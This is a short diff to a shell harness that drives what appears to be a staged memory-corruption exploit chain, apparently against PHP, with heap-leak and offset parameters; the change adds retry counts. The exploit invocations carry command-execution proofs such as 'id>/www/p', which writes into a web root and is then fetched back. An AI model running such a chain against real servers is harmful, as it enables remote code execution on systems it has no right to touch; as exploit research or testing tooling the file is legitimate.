@@ -463,6 +463,7 @@ run_leaks() { # run_leaks <image>
     --zif-offset $zif --dtor-offset $dtor \
     --stage1-n $STAGE1_N --stage1-len $FORGE_LEN \
     --stage2-t $STAGE2_T --stage2-v $STAGE2_V \
+    --retries ${P2S_LEAK_RETRIES:-5} \
     --command 'id>/tmp/p2s-leak'")
   LEAK_RC=$?
   printf '%s\n' "$LEAK_OUT"
@@ -506,7 +507,7 @@ run_chain() { # run_chain <image> [huge-mb]; prints the chain transcript
       --zif-offset $zif --dtor-offset $dtor \
       --htdata-offset ${STAGE3_HTDATA:-0x690d8} \
       --profile bookworm --command 'id>/www/p' --fetch /p \
-      --huge-mb $huge"
+      --retries ${P2S_CHAIN_LEAK_RETRIES:-3} --huge-mb $huge"
 }
 
 proof_body() {
